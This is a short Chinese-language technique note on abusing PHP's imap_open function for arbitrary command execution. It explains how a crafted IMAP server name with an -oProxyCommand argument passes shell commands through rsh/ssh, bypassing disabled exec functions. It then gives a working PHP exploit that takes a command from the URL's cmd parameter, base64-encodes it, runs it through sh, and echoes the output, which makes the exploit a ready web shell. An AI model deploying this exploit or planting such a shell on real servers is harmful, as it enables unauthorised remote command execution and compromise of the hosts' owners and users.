## ***利用 imap_open函数任意命令执行***

**1\. 前提条件**

目标开启了imap扩展，并支持imap_open()函数

**2\. 基本原理**

PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。

**3\. exp**

```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
    die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', '');
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>

```

